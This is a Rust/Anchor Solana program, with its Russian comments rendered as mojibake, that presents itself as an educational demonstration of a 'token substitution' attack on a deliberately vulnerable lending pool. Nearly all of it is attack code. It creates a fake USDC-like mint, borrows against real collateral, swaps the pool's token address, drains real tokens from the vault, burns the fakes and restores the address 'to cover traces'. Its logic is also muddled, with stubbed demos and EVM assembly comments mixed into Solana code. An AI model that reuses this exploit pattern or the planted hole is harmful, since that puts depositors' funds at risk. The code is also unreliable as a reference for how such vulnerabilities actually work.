use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, TokenAccount, Transfer, Mint, MintTo, Burn};
use std::collections::HashMap;

/**
 * –†–µ–∞–ª–∏–∑–∞—Ü–∏—è –º–µ—Ö–∞–Ω–∏–∑–º–æ–≤ –ø–æ–¥–º–µ–Ω—ã —Ç–æ–∫–µ–Ω–æ–≤ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π
 * 
 * –í–ù–ò–ú–ê–ù–ò–ï: –î–∞–Ω–Ω—ã–π –∫–æ–¥ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –¥–ª—è –∏—Ö –∏–∑—É—á–µ–Ω–∏—è –∏ –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è!
 * –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ —Ä–µ–∞–ª—å–Ω—ã—Ö —É—Å–ª–æ–≤–∏—è—Ö –º–æ–∂–µ—Ç –Ω–∞—Ä—É—à–∞—Ç—å –∑–∞–∫–æ–Ω–æ–¥–∞—Ç–µ–ª—å—Å—Ç–≤–æ!
 */

#[derive(Accounts)]
pub struct InitializeVulnerableLending<'info> {
    #[account(
        init,
        payer = authority,
        space = 8 + 32 + 32 + 32 + 8 + 8 + 1 + 1,
        seeds = [b"vulnerable_lending", base_token_mint.key().as_ref()],
        bump,
    )]
    pub vulnerable_lending: Account<'info, VulnerableLendingPool>,
    
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub base_token_mint: Account<'info, Mint>,
    
    #[account(
        init,
        payer = authority,
        token::mint = base_token_mint,
        token::authority = vulnerable_lending,
    )]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct ExecuteTokenSubstitution<'info> {
    #[account(mut)]
    pub attacker: Signer<'info>,
    
    /// –£—è–∑–≤–∏–º—ã–π lending pool (–ø–æ–∑–≤–æ–ª—è–µ—Ç –º–µ–Ω—è—Ç—å –∞–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞)
    #[account(
        mut,
        seeds = [b"vulnerable_lending", vulnerable_lending.current_token_mint.as_ref()],
        bump = vulnerable_lending.bump,
    )]
    pub vulnerable_lending: Account<'info, VulnerableLendingPool>,
    
    #[account(
        init_if_needed,
        payer = attacker,
        space = 8 + 32 + 32 + 8 + 8 + 8,
        seeds = [b"attack_position", attacker.key().as_ref(), vulnerable_lending.key().as_ref()],
        bump,
    )]
    pub attack_position: Account<'info, AttackPosition>,
    
    /// –†–µ–∞–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω (–Ω–∞–ø—Ä–∏–º–µ—Ä, USDC)
    pub real_token_mint: Account<'info, Mint>,
    #[account(mut)]
    pub attacker_real_token_account: Account<'info, TokenAccount>,
    
    /// –ü–æ–¥–¥–µ–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω (—Å–æ–∑–¥–∞–µ—Ç—Å—è –∞—Ç–∞–∫—É—é—â–∏–º)
    #[account(mut)]
    pub fake_token_mint: Account<'info, Mint>,
    #[account(mut)]
    pub attacker_fake_token_account: Account<'info, TokenAccount>,
    
    /// Vault —É—è–∑–≤–∏–º–æ–≥–æ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞
    #[account(mut)]
    pub vulnerable_vault: Account<'info, TokenAccount>,
    
    /// Authority –¥–ª—è –º–∏–Ω—Ç–∏–Ω–≥–∞ –ø–æ–¥–¥–µ–ª—å–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞
    /// CHECK: –ü—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ seeds
    #[account(
        seeds = [b"fake_mint_authority", attacker.key().as_ref()],
        bump,
    )]
    pub fake_mint_authority: AccountInfo<'info>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct CreateFakeToken<'info> {
    #[account(mut)]
    pub attacker: Signer<'info>,
    
    #[account(
        init,
        payer = attacker,
        mint::decimals = 6, // –ö–æ–ø–∏—Ä—É–µ–º decimals —Ä–µ–∞–ª—å–Ω–æ–≥–æ USDC
        mint::authority = fake_mint_authority,
    )]
    pub fake_token_mint: Account<'info, Mint>,
    
    /// CHECK: Authority –¥–ª—è –ø–æ–¥–¥–µ–ª—å–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞
    #[account(
        seeds = [b"fake_mint_authority", attacker.key().as_ref()],
        bump,
    )]
    pub fake_mint_authority: AccountInfo<'info>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct RestoreTokenAddress<'info> {
    #[account(mut)]
    pub attacker: Signer<'info>,
    
    #[account(mut)]
    pub vulnerable_lending: Account<'info, VulnerableLendingPool>,
    
    pub original_token_mint: Account<'info, Mint>,
}

// –£—è–∑–≤–∏–º—ã–π lending pool (–ø–æ–∑–≤–æ–ª—è–µ—Ç –º–µ–Ω—è—Ç—å –∞–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞)
#[account]
pub struct VulnerableLendingPool {
    pub authority: Pubkey,
    pub original_token_mint: Pubkey,
    pub current_token_mint: Pubkey,    // üö® –≠—Ç–æ—Ç –∞–¥—Ä–µ—Å –º–æ–∂–Ω–æ –º–µ–Ω—è—Ç—å!
    pub vault: Pubkey,
    pub total_deposits: u64,
    pub total_borrowed: u64,
    pub bump: u8,
    pub is_substitution_active: bool,  // –§–ª–∞–≥ –∞–∫—Ç–∏–≤–Ω–æ–π –ø–æ–¥–º–µ–Ω—ã
}

#[account]
pub struct AttackPosition {
    pub attacker: Pubkey,
    pub real_token_mint: Pubkey,
    pub fake_token_mint: Pubkey,
    pub collateral_amount: u64,
    pub borrowed_amount: u64,
    pub attack_timestamp: i64,
}

impl<'info> VulnerableLendingPool {
    /// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ–≥–æ lending –ø—Ä–æ—Ç–æ–∫–æ–ª–∞
    pub fn initialize_vulnerable(
        ctx: Context<InitializeVulnerableLending>,
        bump: u8,
    ) -> Result<()> {
        let pool = &mut ctx.accounts.vulnerable_lending;
        pool.authority = ctx.accounts.authority.key();
        pool.original_token_mint = ctx.accounts.base_token_mint.key();
        pool.current_token_mint = ctx.accounts.base_token_mint.key();
        pool.vault = ctx.accounts.vault.key();
        pool.total_deposits = 0;
        pool.total_borrowed = 0;
        pool.bump = bump;
        pool.is_substitution_active = false;
        
        msg!("üö® Vulnerable lending pool initialized - TOKEN ADDRESS CAN BE CHANGED!");
        Ok(())
    }
    
    /// –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–¥–¥–µ–ª—å–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞
    pub fn create_fake_token(ctx: Context<CreateFakeToken>) -> Result<()> {
        msg!("üé≠ Creating fake token with identical interface to real token");
        
        // –ü–æ–¥–¥–µ–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω —Å–æ–∑–¥–∞–µ—Ç—Å—è —Å —Ç–µ–º–∏ –∂–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ —á—Ç–æ –∏ —Ä–µ–∞–ª—å–Ω—ã–π
        // –ù–æ –ø–æ–¥ –ø–æ–ª–Ω—ã–º –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∞—Ç–∞–∫—É—é—â–µ–≥–æ
        
        Ok(())
    }
    
    /// üö® –ö–õ–Æ–ß–ï–í–ê–Ø –£–Ø–ó–í–ò–ú–û–°–¢–¨: –§—É–Ω–∫—Ü–∏—è –ø–æ–¥–º–µ–Ω—ã –∞–¥—Ä–µ—Å–∞ —Ç–æ–∫–µ–Ω–∞
    pub fn substitute_token_address(
        ctx: Context<ExecuteTokenSubstitution>,
        collateral_amount: u64,
        borrow_amount: u64,
    ) -> Result<()> {
        msg!("üé≠ EXECUTING TOKEN SUBSTITUTION ATTACK");
        
        let pool = &mut ctx.accounts.vulnerable_lending;
        let position = &mut ctx.accounts.attack_position;
        
        // –≠—Ç–∞–ø 1: –†–∞–∑–º–µ—â–∞–µ–º –†–ï–ê–õ–¨–ù–´–ï —Ç–æ–∫–µ–Ω—ã –∫–∞–∫ –∑–∞–ª–æ–≥
        msg!("Step 1: Depositing REAL tokens as collateral");
        
        let deposit_real = CpiContext::new(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.attacker_real_token_account.to_account_info(),
                to: ctx.accounts.vulnerable_vault.to_account_info(),
                authority: ctx.accounts.attacker.to_account_info(),
            },
        );
        token::transfer(deposit_real, collateral_amount)?;
        
        // –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –ø–æ–∑–∏—Ü–∏—é —Å –†–ï–ê–õ–¨–ù–´–ú —Ç–æ–∫–µ–Ω–æ–º
        position.attacker = ctx.accounts.attacker.key();
        position.real_token_mint = ctx.accounts.real_token_mint.key();
        position.fake_token_mint = ctx.accounts.fake_token_mint.key();
        position.collateral_amount = collateral_amount;
        position.attack_timestamp = Clock::get()?.unix_timestamp;
        
        pool.total_deposits += collateral_amount;
        
        // –≠—Ç–∞–ø 2: –ó–∞–Ω–∏–º–∞–µ–º –ø—Ä–æ—Ç–∏–≤ –∑–∞–ª–æ–≥–∞
        msg!("Step 2: Borrowing against real collateral");
        
        let pool_seeds = &[
            b"vulnerable_lending",
            pool.current_token_mint.as_ref(),
            &[pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        let borrow_real = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vulnerable_vault.to_account_info(),
                to: ctx.accounts.attacker_real_token_account.to_account_info(),
                authority: ctx.accounts.vulnerable_lending.to_account_info(),
            },
            signer,
        );
        token::transfer(borrow_real, borrow_amount)?;
        
        position.borrowed_amount = borrow_amount;
        pool.total_borrowed += borrow_amount;
        
        // –≠—Ç–∞–ø 3: üé≠ –ö–õ–Æ–ß–ï–í–ê–Ø –ê–¢–ê–ö–ê - –ü–æ–¥–º–µ–Ω—è–µ–º –∞–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞!
        msg!("Step 3: üö® SUBSTITUTING TOKEN ADDRESS!");
        msg!("Original token: {}", pool.current_token_mint);
        msg!("Fake token: {}", ctx.accounts.fake_token_mint.key());
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å –∏ –ø–æ–¥–º–µ–Ω—è–µ–º –Ω–∞ –ø–æ–¥–¥–µ–ª—å–Ω—ã–π
        pool.current_token_mint = ctx.accounts.fake_token_mint.key();
        pool.is_substitution_active = true;
        
        // –≠—Ç–∞–ø 4: –ú–∏–Ω—Ç–∏–º –ø–æ–¥–¥–µ–ª—å–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã —Å–µ–±–µ
        msg!("Step 4: Minting fake tokens to attacker");
        
        let fake_mint_seeds = &[
            b"fake_mint_authority",
            ctx.accounts.attacker.key().as_ref(),
            &[ctx.bumps.fake_mint_authority],
        ];
        let fake_signer = &[&fake_mint_seeds[..]];
        
        let mint_fake = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            MintTo {
                mint: ctx.accounts.fake_token_mint.to_account_info(),
                to: ctx.accounts.attacker_fake_token_account.to_account_info(),
                authority: ctx.accounts.fake_mint_authority.to_account_info(),
            },
            fake_signer,
        );
        token::mint_to(mint_fake, collateral_amount)?;
        
        // –≠—Ç–∞–ø 5: "–í—ã–≤–æ–¥–∏–º" –∑–∞–ª–æ–≥ (–ø—Ä–æ—Ç–æ–∫–æ–ª –¥—É–º–∞–µ—Ç —á—Ç–æ —ç—Ç–æ –ø–æ–¥–¥–µ–ª—å–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã)
        msg!("Step 5: 'Withdrawing' collateral (protocol thinks it's fake tokens)");
        
        // –ü—Ä–æ—Ç–æ–∫–æ–ª –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –±–∞–ª–∞–Ω—Å –ø–æ–¥–¥–µ–ª—å–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ - —É –Ω–∞—Å –µ—Å—Ç—å!
        // –ù–æ –ø–µ—Ä–µ–≤–æ–¥–∏—Ç –†–ï–ê–õ–¨–ù–´–ï —Ç–æ–∫–µ–Ω—ã –∏–∑ vault!
        let withdraw_real = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vulnerable_vault.to_account_info(),
                to: ctx.accounts.attacker_real_token_account.to_account_info(),
                authority: ctx.accounts.vulnerable_lending.to_account_info(),
            },
            signer,
        );
        token::transfer(withdraw_real, collateral_amount)?;
        
        // –°–∂–∏–≥–∞–µ–º –ø–æ–¥–¥–µ–ª—å–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã –¥–ª—è –º–∞—Å–∫–∏—Ä–æ–≤–∫–∏
        let burn_fake = CpiContext::new(
            ctx.accounts.token_program.to_account_info(),
            Burn {
                mint: ctx.accounts.fake_token_mint.to_account_info(),
                from: ctx.accounts.attacker_fake_token_account.to_account_info(),
                authority: ctx.accounts.attacker.to_account_info(),
            },
        );
        token::burn(burn_fake, collateral_amount)?;
        
        // –û–±–Ω–æ–≤–ª—è–µ–º –ø–æ–∑–∏—Ü–∏—é
        position.collateral_amount = 0; // "–ó–∞–ª–æ–≥ –≤—ã–≤–µ–¥–µ–Ω"
        pool.total_deposits -= collateral_amount;
        
        msg!("üéâ TOKEN SUBSTITUTION ATTACK COMPLETED!");
        msg!("Attacker extracted {} real tokens using fake token substitution", collateral_amount);
        msg!("Borrowed amount {} remains unpaid", borrow_amount);
        
        Ok(())
    }
    
    /// –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–∞ —Ç–æ–∫–µ–Ω–∞
    pub fn restore_original_token_address(
        ctx: Context<RestoreTokenAddress>,
    ) -> Result<()> {
        let pool = &mut ctx.accounts.vulnerable_lending;
        
        msg!("Restoring original token address");
        msg!("From: {}", pool.current_token_mint);
        msg!("To: {}", ctx.accounts.original_token_mint.key());
        
        pool.current_token_mint = ctx.accounts.original_token_mint.key();
        pool.is_substitution_active = false;
        
        msg!("‚úÖ Original token address restored - attack traces covered");
        Ok(())
    }
    
    /// üîç –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
    pub fn demonstrate_vulnerability(
        ctx: Context<ExecuteTokenSubstitution>,
    ) -> Result<()> {
        let pool = &ctx.accounts.vulnerable_lending;
        
        msg!("üö® DEMONSTRATING VULNERABILITY IN LENDING PROTOCOL");
        msg!("Current token address: {}", pool.current_token_mint);
        msg!("Original token address: {}", pool.original_token_mint);
        msg!("Substitution active: {}", pool.is_substitution_active);
        
        if pool.is_substitution_active {
            msg!("‚ö†Ô∏è  WARNING: Token address has been substituted!");
            msg!("Protocol thinks it's working with: {}", pool.current_token_mint);
            msg!("But vault contains: tokens from {}", pool.original_token_mint);
            msg!("This allows extraction of real tokens while 'spending' fake ones!");
        }
        
        Ok(())
    }
}

// –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ç–µ—Ö–Ω–∏–∫ –ø–æ–¥–º–µ–Ω—ã

/// –ü–æ–¥–º–µ–Ω–∞ —á–µ—Ä–µ–∑ storage manipulation
pub fn storage_manipulation_demo(
    ctx: Context<ExecuteTokenSubstitution>,
) -> Result<()> {
    msg!("üîß DEMO: Storage slot manipulation technique");
    
    // –í —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ —ç—Ç–æ –±—ã–ª–æ –±—ã —á–µ—Ä–µ–∑ assembly:
    // assembly { sstore(TOKEN_ADDRESS_SLOT, FAKE_TOKEN_ADDRESS) }
    
    let pool = &mut ctx.accounts.vulnerable_lending;
    let original = pool.current_token_mint;
    
    // –ü—Ä—è–º–∞—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—å storage
    pool.current_token_mint = ctx.accounts.fake_token_mint.key();
    
    msg!("Storage manipulated: {} -> {}", original, pool.current_token_mint);
    
    Ok(())
}

/// –ü–æ–¥–º–µ–Ω–∞ —á–µ—Ä–µ–∑ proxy pattern
pub fn proxy_substitution_demo(
    ctx: Context<ExecuteTokenSubstitution>,
) -> Result<()> {
    msg!("üîÑ DEMO: Proxy pattern substitution");
    
    // –ï—Å–ª–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª –∏—Å–ø–æ–ª—å–∑—É–µ—Ç upgradeable proxy:
    // 1. –î–µ–ø–ª–æ–∏–º –Ω–æ–≤—É—é implementation —Å –∏–∑–º–µ–Ω–µ–Ω–Ω—ã–º –∞–¥—Ä–µ—Å–æ–º —Ç–æ–∫–µ–Ω–∞
    // 2. –û–±–Ω–æ–≤–ª—è–µ–º proxy –Ω–∞ –Ω–æ–≤—É—é implementation
    // 3. –í—ã–ø–æ–ª–Ω—è–µ–º –æ–ø–µ—Ä–∞—Ü–∏–∏
    // 4. –û—Ç–∫–∞—Ç—ã–≤–∞–µ–º proxy –Ω–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—É—é implementation
    
    msg!("Proxy implementation would be swapped here");
    
    Ok(())
}

/// –ü–æ–¥–º–µ–Ω–∞ —á–µ—Ä–µ–∑ reentrancy
pub fn reentrancy_substitution_demo(
    ctx: Context<ExecuteTokenSubstitution>,
) -> Result<()> {
    msg!("üîÅ DEMO: Reentrancy-based substitution");
    
    // –í–æ –≤—Ä–µ–º—è reentrancy callback:
    // 1. –ú–µ–Ω—è–µ–º –∞–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞
    // 2. –í—ã–ø–æ–ª–Ω—è–µ–º –æ–ø–µ—Ä–∞—Ü–∏—é –≤—ã–≤–æ–¥–∞
    // 3. –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞–¥—Ä–µ—Å
    
    let pool = &mut ctx.accounts.vulnerable_lending;
    
    // –ò–º–∏—Ç–∏—Ä—É–µ–º reentrancy callback
    let original = pool.current_token_mint;
    pool.current_token_mint = ctx.accounts.fake_token_mint.key();
    
    msg!("During reentrancy: token address changed");
    
    // –û–ø–µ—Ä–∞—Ü–∏—è –≤—ã–≤–æ–¥–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∑–¥–µ—Å—å...
    
    pool.current_token_mint = original;
    msg!("After reentrancy: token address restored");
    
    Ok(())
}

#[error_code]
pub enum TokenSubstitutionError {
    #[msg("Token substitution attack detected")]
    SubstitutionDetected,
    #[msg("Invalid token address")]
    InvalidTokenAddress,
    #[msg("Fake token creation failed")]
    FakeTokenFailed,
    #[msg("Address restoration failed")]
    RestorationFailed,
    #[msg("Vulnerability demonstration failed")]
    DemoFailed,
}